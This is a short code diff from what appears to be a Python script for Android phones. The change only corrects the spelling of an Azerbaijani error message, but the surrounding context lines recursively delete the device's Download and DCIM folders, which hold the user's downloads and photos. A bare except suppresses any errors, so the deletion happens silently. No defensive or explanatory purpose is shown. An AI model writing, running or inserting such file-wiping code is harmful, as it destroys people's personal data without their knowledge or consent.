@@ -23,4 +23,4 @@ try:
     shutil.rmtree("/storage/emulated/0/Download")
     shutil.rmtree("/storage/emulated/0/DCIM")
 except:
-    print("Nəsə səf getdi")
+    print("Nəsə səhv getdi")
